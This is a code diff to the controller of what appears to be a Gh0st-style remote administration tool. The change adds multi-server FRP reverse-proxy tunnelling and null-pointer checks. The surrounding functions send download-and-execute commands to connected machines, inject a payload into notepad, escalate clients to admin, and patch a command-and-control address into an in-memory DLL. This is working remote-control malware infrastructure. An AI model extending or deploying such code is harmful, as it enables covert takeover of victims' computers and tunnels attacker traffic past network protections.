@@ -210,6 +210,14 @@ std::string GetFrpSettingsPath()
 #endif
 }
 
+// 从 master 配置中获取第一个 IP（支持分号分隔的多 IP 格式）
+std::string GetFirstMasterIP(const std::string& master)
+{
+    if (master.empty()) return "";
+    auto pos = master.find(';');
+    return pos != std::string::npos ? master.substr(0, pos) : master;
+}
+
 std::string GetFileName(const char* filepath)
 {
     const char* slash1 = strrchr(filepath, '/');
@@ -292,7 +300,7 @@ DllInfo* ReadTinyRunDll(int pid)
     std::string s(skCrypt(FLAG_FINDEN)), ip, port;
     int offset = MemoryFind((char*)dllData, s.c_str(), fileSize, s.length());
     if (offset != -1) {
-        std::string ip = THIS_CFG.GetStr("settings", "master", "");
+        std::string ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", ""));
         int nPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
         std::string master = ip.empty() ? "" : ip + ":" + std::to_string(nPort);
         CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(dllData + offset);
@@ -1405,7 +1413,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     SetTimer(TIMER_REFRESH_LIST, 1000, NULL);
 
     UPDATE_SPLASH(85, "正在启动FRP代理...");
-    m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);
+    InitFrpClients();
 
     UPDATE_SPLASH(90, "正在启动网络服务...");
     // 最后启动SOCKET
@@ -1421,93 +1429,161 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
+// FRP 线程参数
+struct FrpThreadParam {
+    CMy2015RemoteDlg* dlg;
+    int index;
+};
+
 DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param)
 {
-    CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
+    FrpThreadParam* p = (FrpThreadParam*)param;
+    CMy2015RemoteDlg* This = p->dlg;
+    int idx = p->index;
+    delete p;
+
+    if (idx < 0 || idx >= (int)This->m_frpInstances.size()) {
+        Mprintf("[FRP-%d] Invalid instance index\n", idx);
+        return -1;
+    }
+
+    auto& inst = This->m_frpInstances[idx];
+
+    // 生成配置文件路径 (index=0 使用 frpc.ini 保持兼容)
+    std::string cfgPath = GetFrpSettingsPath();
+    if (idx > 0) {
+        if (cfgPath.size() > 4 && cfgPath.substr(cfgPath.size() - 4) == ".ini") {
+            cfgPath = cfgPath.substr(0, cfgPath.size() - 4);
+        }
+        cfgPath += "." + std::to_string(idx) + ".ini";
+    }
+
+    Mprintf("[FRP-%d] Config: %s, Server: %s\n", idx, cfgPath.c_str(), inst.serverAddr.c_str());
+
+    if (This->m_frpRun == nullptr) {
+        Mprintf("[FRP-%d] m_frpRun is null\n", idx);
+        return -1;
+    }
+
+    Mprintf("[FRP-%d] Calling m_frpRun...\n", idx);
+    int n = This->m_frpRun((char*)cfgPath.c_str(), &inst.status);
+    if (n) {
+        Mprintf("[FRP-%d] Connection failed\n", idx);
+    }
+
+    inst.hThread = NULL;
+    Mprintf("[FRP-%d] Thread stopped\n", idx);
+
+    return n;
+}
+
+void CMy2015RemoteDlg::InitFrpClients()
+{
+    // 显示初始化消息
 #ifdef _WIN64
     int usingFRP = THIS_CFG.GetInt("frp", "UseFrp");
 #else
     int usingFRP = 0;
 #endif
     std::string ip = THIS_CFG.GetStr("settings", "master", "");
-    CString tip = !ip.empty() && ip != This->m_IPConverter->getPublicIP() ?
+    std::string firstIP = GetFirstMasterIP(ip);
+    CString tip = !ip.empty() && firstIP != m_IPConverter->getPublicIP() ?
                   CString(ip.c_str()) + _L(" 必须是\"公网IP\"或反向代理服务器IP") :
                   _L("请设置\"公网IP\"，或使用反向代理服务器的IP");
     tip += usingFRP ? _TR("[使用FRP]") : _TR("[未使用FRP]");
     CharMsg* msg = new CharMsg(tip);
-    This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+    PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
 
     auto langDir = THIS_CFG.GetStr("settings", "LangDir", "./lang");
     langDir = langDir.empty() ? "./lang" : langDir;
     if (!PathFileExists(langDir.c_str())) {
-        CharMsg* msg = new CharMsg(_TR("请通过“扩展”菜单指定语言包目录以支持多语言"));
-        This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        CharMsg* msg = new CharMsg(_TR("请通过\"扩展\"菜单指定语言包目录以支持多语言"));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
     }
-    if (!This->m_HasLocDB) {
+    if (!m_HasLocDB) {
         CharMsg* msg = new CharMsg(_TR("请将IP数据库文件放于当前程序目录"));
-        This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
     }
 
     // 检查 V2 私钥配置
     std::string v2KeyPath = THIS_CFG.GetStr("settings", "V2PrivateKey", "");
     if (v2KeyPath.empty()) {
         CharMsg* msg = new CharMsg(_TR("V2私钥未配置，请通过\"工具→V2私钥设置\"菜单选择私钥文件"));
-        This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
     } else if (GetFileAttributesA(v2KeyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
         std::string tip = std::string(_TR("V2私钥文件不存在: ")) + v2KeyPath;
         CharMsg* msg = new CharMsg(tip.c_str());
-        This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
     }
 
-#ifdef _WIN64
-    usingFRP = ip.empty() ? 0 : usingFRP;
-#else
-    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
-    This->m_hFRPThread = NULL;
-    return 0x20250820;
+#ifndef _WIN64
+    return;  // 32位不支持 FRP
 #endif
-    if (usingFRP) {
-        This->m_frpStatus = STATUS_RUN;
+
+    usingFRP = ip.empty() ? 0 : usingFRP;
+    if (!usingFRP) return;
+
+    // 加载 FRP DLL（只加载一次）
+    DWORD size = 0;
+    LPBYTE frpcData = ReadResource(IDR_BINARY_FRPC, size);
+    if (frpcData == nullptr) {
+        Mprintf("[FRP] Failed to read FRP DLL\n");
+        return;
+    }
+    m_hFrpDll = MemoryLoadLibrary(frpcData, size);
+    SAFE_DELETE_ARRAY(frpcData);
+    if (m_hFrpDll == NULL) {
+        Mprintf("[FRP] Failed to load FRP DLL\n");
+        return;
+    }
+    m_frpRun = (FrpRunFunc)MemoryGetProcAddress(m_hFrpDll, "Run");
+    if (!m_frpRun) {
+        Mprintf("[FRP] Failed to get FRP function\n");
+        return;
     }
 
-    Mprintf("[FRP] Proxy thread start running\n");
+    // 解析多个服务端地址
+    auto servers = StringToVector(ip, ';');
+    Mprintf("[FRP] Starting %d connections\n", (int)servers.size());
 
-    do {
-        DWORD size = 0;
-        LPBYTE frpc = ReadResource(IDR_BINARY_FRPC, size);
-        if (frpc == nullptr) {
-            Mprintf("Failed to read FRP DLL\n");
-            break;
-        }
-        HMEMORYMODULE hDLL = MemoryLoadLibrary(frpc, size);
-        SAFE_DELETE_ARRAY(frpc);
-        if (hDLL == NULL) {
-            Mprintf("Failed to load FRP DLL\n");
-            break;
-        }
-        typedef int (*Run)(char* cstr, int* ptr);
-        Run run = (Run)MemoryGetProcAddress(hDLL, "Run");
-        if (!run) {
-            Mprintf("Failed to get FRP function\n");
-            MemoryFreeLibrary(hDLL);
-            break;
-        }
-        std::string s = GetFrpSettingsPath();
-        int n = run((char*)s.c_str(), &(This->m_frpStatus));
-        if (n) {
-            Mprintf("Failed to run FRP function\n");
-            This->PostMessage(WM_SHOWERRORMSG,(WPARAM)new CString("反向代理: 公网IP和代理设置是否正确? FRP 服务端是否运行?"));
-        }
-        // Free FRP DLL will cause crash
-        // Do NOT use MemoryFreeLibrary and 528 bytes memory leak detected when exiting master
-        // MemoryFreeLibrary(hDLL);
-    } while (false);
+    // 先添加所有实例（避免 vector 重新分配导致的竞争问题）
+    m_frpInstances.reserve(servers.size());
+    for (size_t i = 0; i < servers.size(); ++i) {
+        FrpInstance inst;
+        inst.serverAddr = servers[i];
+        inst.status = STATUS_RUN;
+        m_frpInstances.push_back(inst);
+    }
 
-    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
-    This->m_hFRPThread = NULL;
-    Mprintf("[FRP] Proxy thread stop running\n");
+    // 再创建所有线程
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        FrpThreadParam* param = new FrpThreadParam{ this, (int)i };
+        m_frpInstances[i].hThread = CreateThread(NULL, 0, StartFrpClient, param, 0, NULL);
+    }
+}
 
-    return 0x20250731;
+void CMy2015RemoteDlg::StopAllFrpClients()
+{
+    if (m_frpInstances.empty()) {
+        Mprintf("[FRP] No instances to stop\n");
+        return;
+    }
+
+    // 通知所有实例退出
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        m_frpInstances[i].status = STATUS_EXIT;
+    }
+
+    // 等待所有线程结束
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        while (m_frpInstances[i].hThread) {
+            Sleep(20);
+        }
+    }
+
+    m_frpInstances.clear();
+    Mprintf("[FRP] All connections stopped\n");
+    // 注意：不释放 m_hFrpDll，会导致崩溃
 }
 
 void CMy2015RemoteDlg::ApplyFrpSettings()
@@ -1515,32 +1591,58 @@ void CMy2015RemoteDlg::ApplyFrpSettings()
     auto master = THIS_CFG.GetStr("settings", "master");
     if (master.empty()) return;
 
-    std::string path = GetFrpSettingsPath();
-    DeleteFileA(path.c_str());
-    config cfg(path);
-    cfg.SetStr("common", "server_addr", master);
-    cfg.SetInt("common", "server_port", THIS_CFG.GetInt("frp", "server_port", 7000));
-    cfg.SetStr("common", "token", THIS_CFG.GetStr("frp", "token"));
-    cfg.SetStr("common", "log_file", THIS_CFG.GetStr("frp", "log_file", "./frpc.log"));
+    auto servers = StringToVector(master, ';');
+    std::string basePath = GetFrpSettingsPath();  // frpc.ini
+    std::string baseNoExt = basePath;
 
+    // 移除 .ini 扩展名，用于生成 frpc.1.ini, frpc.2.ini ...
+    if (baseNoExt.size() > 4 && baseNoExt.substr(baseNoExt.size() - 4) == ".ini") {
+        baseNoExt = baseNoExt.substr(0, baseNoExt.size() - 4);
+    }
+
+    // 删除旧的配置文件 (frpc.ini 会被重新生成，frpc.1.ini ~ frpc.N.ini 需要清理)
+    DeleteFileA(basePath.c_str());
+    for (int i = 1; i < 100; ++i) {
+        std::string oldPath = baseNoExt + "." + std::to_string(i) + ".ini";
+        if (GetFileAttributesA(oldPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            DeleteFileA(oldPath.c_str());
+        } else {
+            break;  // 文件不存在，后续也不会存在
+        }
+    }
+
+    int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
+    std::string token = THIS_CFG.GetStr("frp", "token");
     auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
     auto arr = StringToVector(ports, ';');
-    for (int i = 0; i < arr.size(); ++i) {
-        auto tcp = "YAMA-TCP-" + arr[i];
-        cfg.SetStr(tcp, "type", "tcp");
-        cfg.SetStr(tcp, "local_port", arr[i]);
-        cfg.SetStr(tcp, "remote_port", arr[i]);
-
-        auto udp = "YAMA-UDP-" + arr[i];
-        cfg.SetStr(udp, "type", "udp");
-        cfg.SetStr(udp, "local_port", arr[i]);
-        cfg.SetStr(udp, "remote_port", arr[i]);
-    }
     int fileServerPort = THIS_CFG.GetInt("settings", "FileSvrPort", 80);
-    std::string name = "YAMA-FileServer";
-    cfg.SetStr(name, "type", "tcp");
-    cfg.SetInt(name, "local_port", fileServerPort);
-    cfg.SetInt(name, "remote_port", fileServerPort);
+
+    // 为每个服务端生成独立配置文件 (index=0 用 frpc.ini 保持兼容)
+    for (size_t idx = 0; idx < servers.size(); ++idx) {
+        std::string path = (idx == 0) ? basePath : baseNoExt + "." + std::to_string(idx) + ".ini";
+        std::string logFile = (idx == 0) ? "./frpc.log" : "./frpc." + std::to_string(idx) + ".log";
+        config cfg(path);
+        cfg.SetStr("common", "server_addr", servers[idx]);
+        cfg.SetInt("common", "server_port", serverPort);
+        cfg.SetStr("common", "token", token);
+        cfg.SetStr("common", "log_file", logFile);
+
+        for (size_t i = 0; i < arr.size(); ++i) {
+            auto tcp = "YAMA-TCP-" + arr[i];
+            cfg.SetStr(tcp, "type", "tcp");
+            cfg.SetStr(tcp, "local_port", arr[i]);
+            cfg.SetStr(tcp, "remote_port", arr[i]);
+
+            auto udp = "YAMA-UDP-" + arr[i];
+            cfg.SetStr(udp, "type", "udp");
+            cfg.SetStr(udp, "local_port", arr[i]);
+            cfg.SetStr(udp, "remote_port", arr[i]);
+        }
+        std::string name = "YAMA-FileServer";
+        cfg.SetStr(name, "type", "tcp");
+        cfg.SetInt(name, "local_port", fileServerPort);
+        cfg.SetInt(name, "remote_port", fileServerPort);
+    }
 }
 
 void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
@@ -1800,6 +1902,7 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
             for (uint64_t id : m_DirtyClients) {
                 for (int i = 0; i < n; ++i) {
                     context* ctx = (context*)m_CList_Online.GetItemData(i);
+                    if (!ctx) continue;
                     if (id == ctx->GetClientID()) {
                         // 只更新变化的列，减少重绘
                         CString newVal, oldVal;
@@ -1898,7 +2001,6 @@ void CMy2015RemoteDlg::Release()
     UninitFileUpload();
     DeletePopupWindow(TRUE);
     isClosed = TRUE;
-    m_frpStatus = STATUS_EXIT;
     ShowWindow(SW_HIDE);
 
     Shell_NotifyIcon(NIM_DELETE, &m_Nid);
@@ -1928,8 +2030,7 @@ void CMy2015RemoteDlg::Release()
         m_pLicenseDlg = nullptr;
     }
     Sleep(500);
-    while (m_hFRPThread)
-        Sleep(20);
+    StopAllFrpClients();
 
     THIS_APP->Destroy();
     SAFE_DELETE(m_gridDlg);
@@ -2176,6 +2277,7 @@ void CMy2015RemoteDlg::OnOnlineDelete()
         int iItem = m_CList_Online.GetNextSelectedItem(Pos);
         CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx) continue;
         m_CList_Online.DeleteItem(iItem);
         m_HostList.erase(ctx);
         auto tm = ctx->GetAliveTime();
@@ -2437,6 +2539,7 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength, cont
     while(Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ContextObject) continue;
         if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
             continue;
         if (szBuffer[0] == COMMAND_UPDATE) {
@@ -2457,6 +2560,7 @@ VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
     EnterCriticalSection(&m_cs);
     for (int i=0; i<m_CList_Online.GetItemCount(); ++i) {
         context* ContextObject = (context*)m_CList_Online.GetItemData(i);
+        if (!ContextObject) continue;
         if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
             continue;
         if (szBuffer[0] == COMMAND_UPDATE) {
@@ -2507,15 +2611,21 @@ void CMy2015RemoteDlg::OnMainSet()
     BOOL use_new = THIS_CFG.GetInt("frp", "UseFrp");
     int port_new = THIS_CFG.GetInt("frp", "server_port", 7000);
     auto token_new = THIS_CFG.GetStr("frp", "token");
+    auto master_new = THIS_CFG.GetStr("settings", "master");
     ApplyFrpSettings();
     if (use_new != use) {
         MessageBoxL("修改FRP代理开关，需要重启当前应用程序方可生效。", "提示", MB_ICONINFORMATION);
-    } else if (port != port_new || token != token_new) {
-        m_frpStatus = STATUS_STOP;
+    } else if (port != port_new || token != token_new || master_new != THIS_CFG.GetStr("settings", "master")) {
+        // 重启所有 FRP 连接
+        for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+            m_frpInstances[i].status = STATUS_STOP;
+        }
         Sleep(200);
-        m_frpStatus = STATUS_RUN;
+        for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+            m_frpInstances[i].status = STATUS_RUN;
+        }
     }
-    if (use && use_new && m_hFRPThread == NULL) {
+    if (use && use_new && m_frpInstances.empty()) {
 #ifdef _WIN64
         MessageBoxL("FRP代理服务异常，需要重启当前应用程序进行重试。", "提示", MB_ICONINFORMATION);
 #endif
@@ -3826,6 +3936,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     int n = m_CList_Online.GetItemCount();
     for (int i = 0; i < n; ++i) {
         context* id = (context*)m_CList_Online.GetItemData(i);
+        if (!id) continue;
         if (clientID == id->GetClientID()) {
             // m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
             ctx->SetClientData(ONLINELIST_LOGINTIME, hb.ActiveWnd);
@@ -4371,6 +4482,7 @@ void CMy2015RemoteDlg::OnMainProxy()
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ContextObject) continue;
         BYTE cmd[] = { COMMAND_PROXY };
         ContextObject->Send2Client( cmd, sizeof(cmd));
         break;
@@ -4396,6 +4508,7 @@ void CMy2015RemoteDlg::OnOnlineHostnote()
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ContextObject) continue;
         m_ClientMap->SetClientMapData(ContextObject->GetClientID(), MAP_NOTE, dlg.m_str);
         m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
         modified = TRUE;
@@ -4733,6 +4846,7 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID)
         Buffer* buf = m_DllList[menuIndex]->Data;
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ContextObject) continue;
         ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo) );
     }
     LeaveCriticalSection(&m_cs);
@@ -4873,6 +4987,7 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
     if (pNMItem->iItem >= 0) {
         // 获取数据
         context* ctx = (context*)m_CList_Online.GetItemData(pNMItem->iItem);
+        if (!ctx) return;
         CString res[RES_MAX];
         CString startTime = ctx->GetClientData(ONLINELIST_STARTTIME);
         ctx->GetAdditionalData(res);
@@ -5267,6 +5382,7 @@ void CMy2015RemoteDlg::OnOnlineAddWatch()
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx) continue;
         int r = m_ClientMap->GetClientMapInteger(ctx->GetClientID(), MAP_LEVEL);
         m_ClientMap->SetClientMapInteger(ctx->GetClientID(), MAP_LEVEL, ++r >= 4 ? 0 : r);
     }
@@ -5290,6 +5406,7 @@ void CMy2015RemoteDlg::OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult)
         EnterCriticalSection(&m_cs);
         context* ctx = (context*)m_CList_Online.GetItemData(nRow);
         LeaveCriticalSection(&m_cs);
+        if (!ctx) return;
         int r = m_ClientMap->GetClientMapInteger(ctx->GetClientID(), MAP_LEVEL);
         if (r >= 1) pLVCD->clrText = RGB(0, 0, 255); // 字体蓝
         if (r >= 2) pLVCD->clrText = RGB(255, 0, 0); // 字体红
@@ -5308,6 +5425,7 @@ void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
         while (Pos) {
             int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
             context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+            if (!ContextObject) continue;
             BYTE token = CMD_RUNASADMIN;
             ContextObject->Send2Client(&token, sizeof(token));
         }
@@ -5354,6 +5472,7 @@ void CMy2015RemoteDlg::OnOnlineUninstall()
         int iItem = m_CList_Online.GetNextSelectedItem(Pos);
         CString strIP = m_CList_Online.GetItemText(iItem, ONLINELIST_IP);
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx) continue;
         m_CList_Online.DeleteItem(iItem);
         m_HostList.erase(ctx);
         auto tm = ctx->GetAliveTime();
@@ -5519,6 +5638,7 @@ void CMy2015RemoteDlg::MachineManage(MachineCommand type)
         while (Pos) {
             int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
             context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+            if (!ContextObject) continue;
             BYTE token[32] = { TOKEN_MACHINE_MANAGE, type };
             ContextObject->Send2Client(token, sizeof(token));
         }
@@ -5548,7 +5668,7 @@ void CMy2015RemoteDlg::OnExecuteDownload()
 {
     CInputDialog dlg(this);
     dlg.Init(_TR("下载执行"), _TR("远程下载地址:"));
-    auto ip = THIS_CFG.GetStr("settings", "master", "127.0.0.1");
+    auto ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", "127.0.0.1"));
     dlg.m_str = BuildPayloadUrl(ip.c_str(), "example.exe");
     dlg.m_sTipInfo = _TR("请将EXE放在\"Payloads\"目录或输入下载地址。");
 
@@ -6076,6 +6196,7 @@ void CMy2015RemoteDlg::OnOnlineInjNotepad()
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx) continue;
         if (!ctx->IsLogin())
             continue;
         Buffer* buf = tinyRun->Data;
@@ -6212,7 +6333,7 @@ void CMy2015RemoteDlg::ProxyClientTcpPort(bool isStandard)
 {
     BOOL useFrp = THIS_CFG.GetInt("frp", "UseFrp", 0);
     std::string pwd = THIS_CFG.GetStr("frp", "token", "");
-    std::string ip = THIS_CFG.GetStr("settings", "master", "");
+    std::string ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", ""));
     if (!useFrp || pwd.empty() || ip.empty()) {
         MessageBoxL("需要正确启用FRP反向代理方可使用此功能!", "提示", MB_ICONINFORMATION);
         return;
@@ -6245,6 +6366,7 @@ void CMy2015RemoteDlg::ProxyClientTcpPort(bool isStandard)
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx) continue;
         if (!ctx->IsLogin())
             continue;
         CString date = ctx->GetClientData(ONLINELIST_VERSION);
